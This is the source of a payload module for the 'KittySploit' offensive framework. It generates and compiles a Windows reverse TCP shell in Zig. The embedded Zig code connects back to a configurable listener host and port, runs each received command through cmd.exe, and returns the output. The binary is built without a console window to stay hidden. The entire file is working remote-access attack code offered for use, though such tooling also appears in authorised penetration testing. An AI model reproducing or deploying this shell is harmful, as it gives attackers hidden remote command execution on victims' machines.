#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Zig Reverse TCP Shell (Windows) - Pure Zig, no shellcode.
Uses framework Zig compiler; GUI subsystem (no console window).
For Linux use: payloads/singles/cmd/unix/zig_reverse_tcp
"""

from kittysploit import *
from pathlib import Path


class Module(Payload):
    __info__ = {
        'name': 'Zig Reverse TCP Shell (Windows)',
        'description': 'Windows reverse shell in pure Zig - no shellcode. Requires Zig compiler.',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'category': 'singles',
        'arch': [Arch.X64, Arch.X86],
        'platform': Platform.WINDOWS,
        'listener': 'listeners/multi/reverse_tcp',
        'handler': Handler.REVERSE,
        'session_type': SessionType.SHELL,
        'references': [
            'https://ziglang.org/',
        ],
    }

    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    target_arch = OptChoice('x86_64', 'Target architecture', True, choices=['x86_64', 'x86'])
    optimization = OptChoice('ReleaseSmall', 'Optimization level', False,
                             choices=['Debug', 'ReleaseFast', 'ReleaseSafe', 'ReleaseSmall'])
    output_dir = OptString('output', 'Output directory for compiled binary', False)
    auto_compile = OptBool(True, 'Compile binary after generation', False)

    def generate(self):
        """Generate and optionally compile the pure Zig Windows reverse shell. No shellcode."""
        zig_code = self._build_zig_source()
        output_path = Path(self.output_dir) if self.output_dir else Path('output')
        output_path = output_path.resolve()
        output_path.mkdir(parents=True, exist_ok=True)

        src_file = output_path / "zig_reverse_tcp.zig"
        try:
            src_file.write_text(zig_code, encoding='utf-8')
            print_success(f"Source saved: {src_file}")
        except Exception as e:
            print_warning(f"Could not write source file: {e}")

        binary_path = output_path / "shell.exe"

        print_status("Generating Zig Reverse TCP Shell (Windows, pure Zig, no shellcode)...")
        print_info(f"Target: {self.target_arch}-windows")
        print_info(f"Connect to: {self.lhost}:{self.lport}")

        if not self.auto_compile:
            print_info("Auto-compile disabled. Compile manually: zig build-exe -O ReleaseSmall -target " +
                       f"{self.target_arch}-windows zig_reverse_tcp.zig --name shell --subsystem windows")
            return bytes(f"zig_reverse_tcp source: {src_file}", encoding='utf-8')

        ok = self.compile_zig(
            source_code=zig_code,
            output_path=str(binary_path.resolve()),
            target_platform='windows',
            target_arch=self.target_arch,
            optimization=self.optimization,
            strip=True,
            static=True,
            windows_subsystem='windows',
        )

        if ok and binary_path.exists():
            size = binary_path.stat().st_size
            print_success(f"Binary compiled: {binary_path} ({size} bytes)")
            print_info(f"Usage: {binary_path}")
            return bytes(f"zig_reverse_tcp binary: {binary_path}", encoding='utf-8')
        if not ok:
            print_warning("Compilation failed. Check Zig is available.")
        return b''

    def _build_zig_source(self) -> str:
        """Build Zig 0.15 Windows-only source (ws2_32, cmd.exe /c, create_no_window)."""
        return f'''const std = @import("std");
const os = std.os;
const process = std.process;
const mem = std.mem;
const ws2_32 = os.windows.ws2_32;

const HOST = "{self.lhost}";
const PORT: u16 = {int(self.lport)};

const SOCKADDR_IN = extern struct {{
    family: u16,
    port: u16,
    addr: u32,
    zero: [8]u8,
}};

fn connectHost(host: []const u8, port: u16) !ws2_32.SOCKET {{
    var wsa: ws2_32.WSADATA = undefined;
    if (ws2_32.WSAStartup(0x0202, &wsa) != 0) return error.ConnectFailed;
    const sock = ws2_32.socket(2, 1, 0);
    if (sock == ws2_32.INVALID_SOCKET) return error.ConnectFailed;
    var host_buf: [256]u8 = undefined;
    if (host.len >= host_buf.len) return error.BadHost;
    @memcpy(host_buf[0..host.len], host);
    host_buf[host.len] = 0;
    var addr = SOCKADDR_IN{{
        .family = 2,
        .port = ws2_32.htons(port),
        .addr = ws2_32.inet_addr(&host_buf),
        .zero = [_]u8{{0}} ** 8,
    }};
    if (ws2_32.connect(sock, @ptrCast(&addr), @sizeOf(SOCKADDR_IN)) != 0) return error.ConnectFailed;
    return sock;
}}

fn sendAll(sock: ws2_32.SOCKET, data: []const u8) !void {{
    var sent: usize = 0;
    while (sent < data.len) {{
        const n = ws2_32.send(sock, data.ptr + sent, @intCast(data.len - sent), 0);
        if (n == ws2_32.SOCKET_ERROR) return error.SendFailed;
        sent += @intCast(n);
    }}
}}

fn recvLine(allocator: std.mem.Allocator, sock: ws2_32.SOCKET, max_len: usize) ![]u8 {{
    var list = std.ArrayList(u8).empty;
    var buf: [1]u8 = undefined;
    while (list.items.len < max_len) {{
        const n = ws2_32.recv(sock, &buf, 1, 0);
        if (n == ws2_32.SOCKET_ERROR or n == 0) return error.Closed;
        if (buf[0] == '\\n') break;
        if (buf[0] != '\\r') try list.append(allocator, buf[0]);
    }}
    return try list.toOwnedSlice(allocator);
}}

fn execCmd(allocator: std.mem.Allocator, cmd: []const u8, cwd: ?[]const u8) ![]u8 {{
    const trimmed = mem.trim(u8, cmd, " \\r\\n");
    if (trimmed.len == 0) return allocator.dupe(u8, "");
    var args = std.ArrayList([]const u8).empty;
    defer args.deinit(allocator);
    try args.append(allocator, "cmd.exe");
    try args.append(allocator, "/c");
    try args.append(allocator, trimmed);
    var child = process.Child.init(args.items, allocator);
    child.cwd = cwd;
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    child.create_no_window = true;
    child.spawn() catch |e| {{
        return std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}});
    }};
    var out = std.ArrayList(u8).empty;
    defer out.deinit(allocator);
    var err = std.ArrayList(u8).empty;
    defer err.deinit(allocator);
    child.collectOutput(allocator, &out, &err, 1024 * 1024) catch |e| {{
        return std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}});
    }};
    _ = child.wait() catch {{}};
    if (err.items.len == 0) return allocator.dupe(u8, out.items);
    var combined = std.ArrayList(u8).empty;
    try combined.appendSlice(allocator, out.items);
    try combined.appendSlice(allocator, err.items);
    return try combined.toOwnedSlice(allocator);
}}

pub fn main() !void {{
    var gpa = std.heap.GeneralPurposeAllocator(.{{.safety = false}}){{}};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    const cwd = process.getCwdAlloc(allocator) catch null;
    defer if (cwd) |c| allocator.free(c);

    const sock = try connectHost(HOST, PORT);
    defer _ = ws2_32.closesocket(sock);

    while (true) {{
        const cmd = recvLine(allocator, sock, 8192) catch break;
        defer allocator.free(cmd);
        const out = execCmd(allocator, cmd, cwd) catch |e| {{
            const msg = std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}}) catch break;
            defer allocator.free(msg);
            sendAll(sock, msg) catch break;
            continue;
        }};
        defer allocator.free(out);
        sendAll(sock, out) catch break;
    }}
}}
'''
